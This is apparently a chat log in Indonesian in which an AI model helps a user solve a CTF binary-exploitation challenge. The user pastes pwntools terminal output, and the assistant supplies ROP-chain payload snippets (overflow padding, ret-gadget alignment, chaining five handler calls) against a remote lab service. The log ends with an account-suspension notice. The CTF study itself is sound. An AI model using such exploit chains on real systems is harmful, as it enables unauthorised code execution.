+lah serius gini?
+kok ada yang kembar gambarnya?
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ python3 olla.py
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (83B)
+[*] Closed connection to 10.34.9.91 port 10030
+[money] May your choice not lead to your doom
+With this, you can buy anything in the world
+
+[money] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (127B)
+[*] Closed connection to 10.34.9.91 port 10030
+[longevity] May your choice not lead to your doom
+With this, you can't possibly die
+Your result has been updated. Refresh the Result page.
+
+[longevity] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (81B)
+[*] Closed connection to 10.34.9.91 port 10030
+[wise_mind] May your choice not lead to your doom
+With this, you will be able to see through
+
+[wise_mind] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (123B)
+[*] Closed connection to 10.34.9.91 port 10030
+[love] May your choice not lead to your doom
+With this, you will be adored
+Your result has been updated. Refresh the Result page.
+
+[love] image saved
+[/.......] Opening connection to 10.34.9.91 on port 10030: Trying 10.34[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (0B)
+[*] Closed connection to 10.34.9.91 port 10030
+[food] 
+[food] image saved
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ ls
+chall       core.52541  core.65876  exploit.py     money.png
+core.52532  core.52544  core.65881  food.png       olla.py
+core.52535  core.65621  core.65885  longevity.png  wise_mind.png
+core.52538  core.65860  core.65889  love.png
+
+WKWKWK NAH ITU DIA! 🎯
+
+"Kok ada yang kembar gambarnya?" — itu PETUNJUK BESAR!
+🧠 Analisis:
+
+5 gambar dari 5 handler:
+
+    money.png
+
+    longevity.png
+
+    wise_mind.png
+
+    love.png
+
+    food.png
+
+Ada yang KEMBAR / SAMA! Berarti beberapa handler ngasih result yang SAMA — dan satu/beberapa yang BEDA itu "right path"!
+🔍 Cek Hash Gambar:
+bash
+
+md5sum *.png
+# atau
+sha256sum *.png
+
+Yang hash-nya sama = result yang sama (fake).
+Yang hash-nya BEDA = "right path"! 🎯
+🎯 Cek Juga Ukuran:
+bash
+
+ls -la *.png
+
+Yang ukurannya beda = flag bener!
+🔥 Next Step:
+bash
+
+# 1. Cek hash
+md5sum *.png | sort
+
+# 2. Cek ukuran
+ls -la *.png | sort -k5 -n
+
+# 3. Lihat gambar yang beda
+xdg-open money.png
+xdg-open love.png
+# dst
+
+💡 Kemungkinan:
+
+    4 gambar kembar (fake) + 1 gambar beda (flag bener) → handler itu yang "right path"
+
+    Atau semua kembar → berarti "right path" bukan dari handler, tapi path injection
+
+🎯 Share:
+bash
+
+md5sum *.png
+ls -la *.png
+
+Dari situ kita tau mana yang "right path"! Gas wok! 🔥
+bentar lu udh bener ngga ekstraknya, kelima handler itu yang di ambil gambarnya, jangan cuman 4, ini ko kayak 4 doang sih:
+python3 olla.py
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (83B)
+[*] Closed connection to 10.34.9.91 port 10030
+[money] May your choice not lead to your doom
+With this, you can buy anything in the world
+
+[money] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (127B)
+[*] Closed connection to 10.34.9.91 port 10030
+[longevity] May your choice not lead to your doom
+With this, you can't possibly die
+Your result has been updated. Refresh the Result page.
+
+[longevity] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (81B)
+[*] Closed connection to 10.34.9.91 port 10030
+[wise_mind] May your choice not lead to your doom
+With this, you will be able to see through
+
+[wise_mind] image saved
+[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (123B)
+[*] Closed connection to 10.34.9.91 port 10030
+[love] May your choice not lead to your doom
+With this, you will be adored
+Your result has been updated. Refresh the Result page.
+
+[love] image saved
+[/.......] Opening connection to 10.34.9.91 on port 10030: Trying 10.34[+] Opening connection to 10.34.9.91 on port 10030: Done
+[+] Receiving all data: Done (0B)
+[*] Closed connection to 10.34.9.91 port 10030
+[food] 
+[food] image saved
+
+WKWKWK NAH INI MASALAHNYA! 🤦♂️
+
+"food" ngasih output KOSONG (0B) — dan [food] image saved tetep jalan, tapi mungkin gambarnya BEDA / gagal / sama kayak sebelumnya.
+
+Masalah utama: Lu connect ke port yang SAMA (10030) 5x — tapi instance id BEDA tiap connect! Jadi:
+
+    Connect 1 → instance A → exploit money → gambar A
+
+    Connect 2 → instance B → exploit longevity → gambar B
+
+    Connect 3 → instance C → exploit wise_mind → gambar C
+
+    Connect 4 → instance D → exploit love → gambar D
+
+    Connect 5 → instance E → exploit food → gambar E
+
+Tapi semua instance itu... SAMA? Atau beda?
+
+Kalau instance-nya SAMA (karena port 10030 itu fixed), maka result page-nya juga sama — makanya gambar "kembar"!
+🎯 Masalah Sebenarnya:
+
+Lu harus pake instance yang SAMA buat semua handler, tapi instance id BEDA tiap connect. Jadi:
+
+    Connect sekali → catat instance id
+
+    Exploit handler di koneksi itu → server update result page instance itu
+
+    Download gambar dari instance itu
+
+    Ulangi buat handler lain — tapi instance id beda lagi!
+
+Jadi lu GAK BISA dapetin 5 gambar dari instance yang sama — karena tiap connect = instance baru!
+💡 Kecuali — Lu Panggil SEMUA Handler dalam SATU Koneksi!
+
+ROP chain yang manggil 5 handler berurutan:
+python
+
+payload = b'A' * 72
+for name, off in HANDLERS.items():
+    payload += p64(pie_base + RET_GADGET)
+    payload += p64(pie_base + off)
+
+r.sendline(payload)
+
+Nanti server bakal dapet 5 request (money, longevity, wise_mind, love, food) — dan result page instance itu bakal nampilin 5 result!
+
+Atau — server cuma nyimpen result terakhir, jadi lu harus panggil satu-satu di instance yang sama.
+🔥 TAPI — Mungkin "food" yang Bener!
+
+food ngasih output KOSONG — mungkin karena SIGSEGV (alignment issue) sebelum sempet print. Coba tambahin ret gadget lagi:
+python
+
+payload = b'A' * 72
+payload += p64(pie_base + RET_GADGET)  # ret 1
+payload += p64(pie_base + RET_GADGET)  # ret 2 (extra alignment)
+payload += p64(handler)
+
+Atau — food handler emang beda — mungkin dia yang "right path"!
+🎯 Next Step:
+
+1. Cek hash gambar yang udah ada:
+bash
+
+md5sum *.png
+ls -la *.png
+
+2. Coba food dengan alignment tambahan:
+python
+
+payload = b'A' * 72
+payload += p64(pie_base + RET_GADGET)
+payload += p64(pie_base + RET_GADGET)  # extra
+payload += p64(handler_food)
+
+3. Panggil SEMUA handler dalam SATU koneksi:
+python
+
+payload = b'A' * 72
+for name, off in HANDLERS.items():
+    payload += p64(pie_base + RET_GADGET)
+    payload += p64(pie_base + off)
+r.sendline(payload)
+
+4. Cek result page instance itu — mungkin ada 5 gambar / 1 flag bener.
+⚡ Share:
+
+    md5sum *.png + ls -la *.png
+
+    Output kalau panggil semua handler sekaligus dalam 1 koneksi
+
+    Coba food dengan alignment tambahan
+
+Gas wok! 🔥
+Due to violation of user policies, your account has been suspended until October 2, 2026 02:53. If you have any questions, please
+.
